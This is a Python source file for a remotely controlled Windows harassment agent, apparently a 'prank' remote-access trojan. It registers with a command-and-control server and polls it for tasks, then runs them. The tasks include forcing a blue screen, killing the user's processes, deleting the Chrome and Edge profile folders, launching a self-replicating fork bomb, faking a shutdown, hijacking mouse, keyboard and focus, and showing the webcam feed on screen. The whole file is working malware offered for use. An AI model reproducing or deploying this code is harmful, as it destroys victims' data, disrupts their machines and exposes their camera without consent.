# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os, sys, socket, uuid, time, requests, threading, subprocess, random, string, tkinter as tk, shutil
try:
    import pyautogui, winsound, webbrowser, ctypes, psutil, cv2
    from PIL import Image, ImageTk
except ImportError: pass

# ==================================================================================================
# CONFIGURATION & GLOBALS
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003"; HEARTBEAT_INTERVAL = 5
STATE = { "noise": False, "clicking": False, "typing": False, "caps_spam": False, "overlay": False, "usb_spam": False, "focus_steal": False, "cursor_change": False, "app_spam": False, "streamer_cam": False }
OVERLAY_WINDOW, CAM_WINDOW, GUI_ROOT = None, None, None

# ==================================================================================================
# ACTION FUNCTIONS (ALL IMPLEMENTED)
# ==================================================================================================
def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "abort_retry_ignore": 0x02, "yes_no_cancel": 0x03, "yes_no": 0x04, "retry_cancel": 0x05}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()
def _noise_loop():
    while STATE["noise"]: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)
def toggle_noise():
    STATE["noise"] = not STATE["noise"]
    if STATE["noise"]: threading.Thread(target=_noise_loop, daemon=True).start()
def _usb_spam_loop():
    while STATE["usb_spam"]:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
def toggle_usb_spam():
    STATE["usb_spam"] = not STATE["usb_spam"]
    if STATE["usb_spam"]: threading.Thread(target=_usb_spam_loop, daemon=True).start()
def _caps_lock_loop():
    while STATE["caps_spam"]:
        if ctypes.windll.user32.GetKeyState(0x14) == 0:
            ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)
def toggle_caps_lock_spam():
    STATE["caps_spam"] = not STATE["caps_spam"]
    if STATE["caps_spam"]: threading.Thread(target=_caps_lock_loop, daemon=True).start()
def _create_overlay(color='black', alpha=0.5):
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', alpha)
    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg=color)
    OVERLAY_WINDOW.overrideredirect(True)
def _hide_overlay():
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
def toggle_overlay(color='black', alpha=0.5):
    STATE["overlay"] = not STATE["overlay"]
    if STATE["overlay"]: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
    else: GUI_ROOT.after(0, _hide_overlay)
def _random_clicking_loop():
    w, h = pyautogui.size()
    while STATE["clicking"]: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def toggle_random_clicking():
    STATE["clicking"] = not STATE["clicking"]
    if STATE["clicking"]: threading.Thread(target=_random_clicking_loop, daemon=True).start()
def _random_typing_loop():
    while STATE["typing"]:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def toggle_random_typing():
    STATE["typing"] = not STATE["typing"]
    if STATE["typing"]: threading.Thread(target=_random_typing_loop, daemon=True).start()
def _app_spam_loop():
    apps = ['notepad', 'calc', 'cmd', 'mspaint', 'explorer']
    while STATE["app_spam"]:
        try: os.startfile(random.choice(apps))
        except: pass
        time.sleep(random.uniform(1, 4))
def toggle_app_spam():
    STATE["app_spam"] = not STATE["app_spam"]
    if STATE["app_spam"]: threading.Thread(target=_app_spam_loop, daemon=True).start()
def _focus_stealer_loop():
    p = subprocess.Popen(['notepad.exe'], creationflags=0x08000000)
    time.sleep(1)
    hwnd = ctypes.windll.user32.FindWindowW("Notepad", None)
    while STATE["focus_steal"]:
        try:
            if ctypes.windll.user32.GetForegroundWindow() != hwnd:
                ctypes.windll.user32.SetForegroundWindow(hwnd)
        except: pass
        time.sleep(3)
    p.terminate()
def toggle_focus_stealer():
    STATE["focus_steal"] = not STATE["focus_steal"]
    if STATE["focus_steal"]: threading.Thread(target=_focus_stealer_loop, daemon=True).start()
def _cursor_changer_loop():
    cursors = [32512, 32513, 32514, 32515, 32516, 32640, 32642, 32643, 32644, 32645, 32646, 32648, 32649]
    while STATE["cursor_change"]:
        hcursor = ctypes.windll.user32.LoadCursorW(None, random.choice(cursors))
        ctypes.windll.user32.SetSystemCursor(hcursor, 32512)
        time.sleep(2)
    ctypes.windll.user32.SystemParametersInfoW(87, 0, None, 0)
def toggle_cursor_changer():
    STATE["cursor_change"] = not STATE["cursor_change"]
    if STATE["cursor_change"]: threading.Thread(target=_cursor_changer_loop, daemon=True).start()
def fake_shutdown(message="Windows is updating..."):
    def _sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, creationflags=0x08000000)
        time.sleep(30); subprocess.run('shutdown /a', shell=True, creationflags=0x08000000)
        show_popup("Update Failed", "The update could not be installed.", "error")
    threading.Thread(target=_sequence, daemon=True).start()
def kill_tasks():
    critical = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and user in proc.info['username'] and proc.info['name'].lower() not in critical:
                psutil.Process(proc.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
def bsod():
    nullptr = ctypes.pointer(ctypes.c_int()); ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))
def browser_eraser():
    for path in [os.path.join(os.environ["LOCALAPPDATA"], b) for b in [os.path.join("Google", "Chrome", "User Data"), os.path.join("Microsoft", "Edge", "User Data")]]:
        if os.path.exists(path): shutil.rmtree(path, ignore_errors=True)
def fork_bomb():
    bomb_code = "import os\nwhile True: os.startfile(os.path.realpath(__file__))"
    bomb_path = os.path.join(os.environ["TEMP"], "sysinit.pyw")
    with open(bomb_path, "w") as f: f.write(bomb_code)
    os.startfile(bomb_path)
def set_wallpaper(path):
    if os.path.exists(path): ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
def _streamer_cam_loop():
    global CAM_WINDOW
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): print("Cannot open camera"); return
    def _update_cam():
        if not STATE["streamer_cam"]:
            if CAM_WINDOW: CAM_WINDOW.destroy(); CAM_WINDOW = None; cap.release()
            return
        ret, frame = cap.read()
        if ret:
            img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB); img = Image.fromarray(img); imgtk = ImageTk.PhotoImage(image=img)
            CAM_WINDOW.label.imgtk = imgtk; CAM_WINDOW.label.configure(image=imgtk)
        GUI_ROOT.after(100, _update_cam)
    def _create_cam_window():
        global CAM_WINDOW
        CAM_WINDOW = tk.Toplevel(GUI_ROOT); CAM_WINDOW.title("Webcam"); CAM_WINDOW.attributes("-topmost", True)
        screen_width = GUI_ROOT.winfo_screenwidth(); CAM_WINDOW.geometry(f"320x240+{screen_width - 340}+20")
        CAM_WINDOW.overrideredirect(True); CAM_WINDOW.label = tk.Label(CAM_WINDOW); CAM_WINDOW.label.pack()
        _update_cam()
    GUI_ROOT.after(0, _create_cam_window)
def toggle_streamer_cam():
    STATE["streamer_cam"] = not STATE["streamer_cam"]
    if STATE["streamer_cam"]: threading.Thread(target=_streamer_cam_loop, daemon=True).start()

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        ACTION_MAP = {
            "show_popup": show_popup, "toggle_noise": toggle_noise, "toggle_caps_lock_spam": toggle_caps_lock_spam,
            "toggle_overlay": toggle_overlay, "hide_overlay": lambda: GUI_ROOT.after(0, _hide_overlay),
            "open_website": open_website, "toggle_random_clicking": toggle_random_clicking,
            "toggle_random_typing": toggle_random_typing, "toggle_usb_spam": toggle_usb_spam, 
            "fake_shutdown": fake_shutdown, "kill_tasks": kill_tasks, "bsod": bsod, 
            "browser_eraser": browser_eraser, "fork_bomb": fork_bomb, 
            "set_wallpaper": set_wallpaper, "toggle_streamer_cam": toggle_streamer_cam,
            "toggle_app_spam": toggle_app_spam, "toggle_focus_stealer": toggle_focus_stealer,
            "toggle_cursor_changer": toggle_cursor_changer
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")

def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200 and "tasks" in (data := response.json()):
                process_tasks(data["tasks"])
        except: pass
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True)
    c2_thread.start()
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw()
    GUI_ROOT.mainloop()